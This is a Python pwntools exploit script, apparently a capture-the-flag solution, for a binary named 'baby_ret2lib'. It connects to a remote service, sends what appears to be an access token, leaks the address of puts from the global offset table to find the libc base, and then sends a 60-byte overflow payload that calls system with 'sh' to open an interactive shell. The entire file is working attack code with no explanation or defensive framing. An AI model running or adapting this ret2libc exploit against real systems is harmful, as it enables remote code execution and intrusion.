#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
p = remote("10.214.10.18",11523)
#p = process('./baby_ret2lib')
payload = '3160104501.6880c7b179fd087c3c9a75917a028647'
p.sendline(payload)
elf = ELF("./baby_ret2lib")
libc = ELF("./libc.so.6")
p.sendlineafter(":",str(elf.got["puts"]))
p.recvuntil(" : ")
libc.address = int(p.recvuntil("\n",drop=True),16) - libc.symbols["puts"]
success("libcBase -> {:#x}".format(libc.address))
payload = flat('a'*60,libc.symbols["system"],0xcafebabe,next(elf.search("sh\x00")))
p.sendlineafter(" :",payload)
p.sendline(payload)
p.interactive()

